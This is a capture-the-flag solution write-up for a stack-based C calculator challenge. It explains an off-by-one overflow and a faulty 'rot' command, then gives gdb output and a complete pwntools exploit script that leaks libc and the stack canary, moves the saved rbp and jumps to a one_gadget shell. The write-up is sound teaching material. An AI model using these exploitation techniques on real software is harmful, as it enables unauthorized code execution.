# Reverse Polish Pwn &mdash; Solution
The target program is a simple command line stack-based calculator written in C.
```c
#define STACK_MAX 65

typedef struct {
    int sp;
    int data[STACK_MAX];
} Stack;

void msg(const char *msg) {
    fprintf(stderr, "error: %s\n", msg);
}

int need(Stack *s, int n) {
    if(s->sp < n) {
        msg("stack underflow");
        return 1;
    }
    return 0;
}

int push(Stack *s, int v) {
    if(s->sp > STACK_MAX) {
        msg("stack overflow");
        return 1;
    }
    s->data[s->sp++] = v;
    return 0;
}

int popv(Stack *s) {
    return s->data[--s->sp];
}

int process_line(char *line) {
    Stack st;
    st.sp = 0;
    char *tok = strtok(line, " \t\r\n");
    static char cmd[32];
    while (tok) {
        strncpy(cmd, tok, 32);
        cmd[31]=0;
        if (!strcmp(cmd,"push")) {
            char *num = strtok(NULL, " \t\r\n");
            if (!num) {
                msg("push needs a number");
                return 1;
            }
            char *end;
            long v = strtol(num, &end, 10);
            if (*end) {
                msg("invalid integer");
                return 1;
            }
            if (push(&st, (int)v))
                return 1;
        } else if (!strcmp(cmd,"pop")) {
            if (need(&st,1))
                return 1;
            printf("%d\n", popv(&st));
        } else if (!strcmp(cmd,"add")) {
            if (need(&st,2))
                return 1;
            int b=popv(&st);
            int a=popv(&st);
            if (push(&st, a+b))
                return 1;
        } else if (!strcmp(cmd,"sub")) {
            if (need(&st,2))
                return 1;
            int b=popv(&st);
            int a=popv(&st);
            if (push(&st, a-b))
                return 1;
        } else if (!strcmp(cmd,"rot")) { // (x1 x2 x3 -- x2 x3 x1)
            if (need(&st,3))
                return 1;
            int x1 = st.data[st.sp-1];
            int x2 = st.data[st.sp];
            int x3 = st.data[st.sp+1];
            st.data[st.sp-1] = x2;
            st.data[st.sp] = x3;
            st.data[st.sp+1] = x1;
        } else if (!strcmp(cmd,"dup")) {
            if (need(&st,1))
                return 1;
            if (push(&st, st.data[st.sp-1]))
                return 1;
        } else {
            msg("unknown command");
            return 1;
        }
        tok = strtok(NULL, " \t\r\n");
    }
    return 0;
}

void rpn_loop() {
    char line[1024];
    printf("RPN> ");
    while (fgets(line, sizeof line, stdin)) {
        if (process_line(line)) {
            return ;
        }
        printf("RPN> ");
    }
}

int main(void){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    char help[] =
        "RPN calculator commands:\n"
        " push <num>  - push number onto stack\n"
        " pop         - pop number from stack and print it\n"
        " add         - pop two numbers, add them, push result\n"
        " sub         - pop two numbers, subtract second from first, push result\n"
        " dup         - duplicate top stack value\n"
        " rot         - rotate top three stack values\n";
    printf("%s", help);
    rpn_loop();
    printf("Bye\n");
    return 0;
}
```

Quick inspection reveals two issues that we will be exploiting:
- Off-by-one error in `if(s->sp > STACK_MAX)` allows us to push one 4-byte integer to the calculator stack overflowing the `st.data` array.
- Incorrect indices in the `rot` command allow us to manipulate two elements beyond the current calculator stack top.

The details will get a bit tricky, but these two bugs together allow us to read and write 12 bytes past the local variable `st.data` in function `process_line`.

Filling the calculator stack fully and inspecting with the debugger reveals that `st.data` is on the bottom of the stack frame, hence we can read/write the [canary](https://ctf101.org/binary-exploitation/stack-canaries/) and the lower 4 bytes of the saved `$rbp` value.

```bash
# python3 -c "print('push -1 '*65)" > input.txt && gdb ./chall -ex "b *(process_line+1086)" -ex "run < input.txt"
...
Breakpoint 1, 0x000065303bc00ec4 in process_line ()
gef➤  telescope $rbp-0x40
0x007fff301179c0│+0x0000: 0xffffffffffffffff
0x007fff301179c8│+0x0008: 0xffffffffffffffff
0x007fff301179d0│+0x0010: 0xffffffffffffffff
0x007fff301179d8│+0x0018: 0xffffffffffffffff
0x007fff301179e0│+0x0020: 0xffffffffffffffff
0x007fff301179e8│+0x0028: 0xffffffffffffffff
0x007fff301179f0│+0x0030: 0xffffffffffffffff ← ***st.data[64] st.data[63] ***
0x007fff301179f8│+0x0038: 0xeb08e496dfe28c00 ← ***canary***
0x007fff30117a00│+0x0040: 0x007fff30117e20  →  0x007fff30117f80  →  0x0065303bc01020  →  <__libc_csu_init+0> push r15	 ← $rbp
0x007fff30117a08│+0x0048: 0x0065303bc00f02  →  <rpn_loop+60> test eax, eax
```

This will enable us to hijack execution flow. As usual, the compiled functions in this program end with the `leave; ret` epilogue. Instruction `leave` is equivalent to `mov $rsp, $rbp; pop $rbp` --- if we change the *saved* `$rbp` value to address $x$ then:
- After the `leave; ret` of `process_line`, value of `$rbp` will be $x$, `$rsp` is not tampered with, so the execution resumes normally.
- Now the `rpn_loop` continues, but its stack frame is based on $x$.
- After the `leave` of `rpn_loop`, value of `$rsp` will be $x+8$.
- The `ret` instruction will trigger the ROP chain on address $x+8$, if we were to put it there.

Hence, to trigger the ROP chain we need to:
1) modify the saved `$rbp` value, so it points to $x$,
2) place a ROP chain at address $x+8$, but also
3) place the canary at address $x-8$, otherwise the stack smashing logic at the end of the `rpn_loop` function will trigger.

Reading and writing data beyond the calculator stack top requires crafting short programs for the calculator that exploit the bug in the `rot` implementation. For example to read the 4 byte integer at index $n$ (e.g., the uninitialized value of `st.data[n]`), we can use the following input:

| Command | Stack Layout |
|---------|--------------|
| `push -1` ($n-2$ times) | `-1 -1 ... -1 -1 ] x y z` |
| `rot`   | `-1 -1 ... -1 x ] y -1 z` |
| `rot`   | `-1 -1 ... -1 y ] -1 x z` |
| `dup`   | `-1 -1 ... -1 y y ] x z` |
| `pop`   | `-1 -1 ... -1 y ] y x z` |
| `rot`   | `-1 -1 ... -1 y ] x y z` |

This method enables us to:
- Leak the libc address in the uninitialized bytes of `st.data`, that we will use to calculate the win address using [one_gadget](https://github.com/david942j/one_gadget).
- Leak the canary.

Finally, we need to find a good address to change `$rbp` to, and write the canary and our win address there. The model solution does all of this using only one calculator command --- the calculator stack itself will be the memory area that we target. The data is written there using `push` commands and the saved `$rbp` is modified by a fixed offset using a similar program as above.

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 11342)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            continue
        ''')
    return p

p = conn()

def get_libc(p):
    p.sendlineafter(b'RPN> ', b' push 255'*12 + b' rot rot dup pop rot')
    lo = (int(p.recvline().strip())+2**32)%2**32
    p.sendlineafter(b'RPN> ', b' push 255'*13 + b' rot rot dup pop rot')
    hi = (int(p.recvline().strip())+2**32)%2**32
    addr = lo | (hi << 32)
    print(f'addr = {addr:16x}')
    return addr

def get_canary(p):
    #      ...  0xff | 0 clo chi
    # rot: ...  0 | clo 0xff chi
    # rot: ...  clo | 0xff 0 chi
    # dup: ...  clo clo | 0xff 0 chi
    # pop: ...  clo | 0xff 0 chi
    # rot: ...  0xff |  0 clo chi
    p.sendlineafter(b'RPN> ', b' push 255'*64 + b' rot rot dup pop rot')
    clo = (int(p.recvline().strip())+2**32)%2**32
    p.sendlineafter(b'RPN> ', b' push 255'*65 + b' rot rot dup pop rot')
    chi = (int(p.recvline().strip())+2**32)%2**32
    canary = clo | (chi << 32)
    print(f'canary = {canary:16x}')
    return canary

def add_ebp_lo(p, canary, x, gadget):
    #           ... x | clo chi ebplo
    # push clo: ... x clo | chi ebplo
    #      rot: ... x chi | ebplo clo
    #      rot: ... x ebplo | clo chi
    #      add: ... ebplo+x | ebplo clo chi
    #      dup: ... ebplo+x ebplo+x | clo chi
    #      rot: ... ebplo+x clo | chi ebplo+x
    command = b''
    clo = canary & 0xffffffff
    chi = canary >> 32
    glo = gadget & 0xffffffff
    ghi = gadget >> 32
    data = [0, clo, chi, 0xbabadeda, 0xdeadbeef, glo, ghi]
    for d in data:
        command += b' push ' + str(d).encode()
    command += b' push 0'*(64-len(data))
    command += b' push ' + str(x).encode()
    command += b' push ' + str(clo).encode()
    command += b' rot rot add dup rot pop pop xxx'
    p.sendlineafter(b'RPN> ', command)
    clo_again = (int(p.recvline().strip())+2**32)%2**32
    new_ebp_lo = (int(p.recvline().strip())+2**32)%2**32
    print(f'new_ebp_lo = {new_ebp_lo:08x}')
    assert clo_again == clo
    return new_ebp_lo


# 0x007b2f9d1f7ee6 -- printf+166
libc_leak = get_libc(p)
elf = ELF('./libc-2.27.so')
printf_offset = elf.symbols['printf']+166
libc_base = libc_leak - printf_offset
print(f'libc_base = {libc_base:016x}')
gadget = 0x4f2a5 + libc_base

canary = get_canary(p)
new_ebp_lo = add_ebp_lo(p, canary, -0x520, gadget)

p.interactive()
```
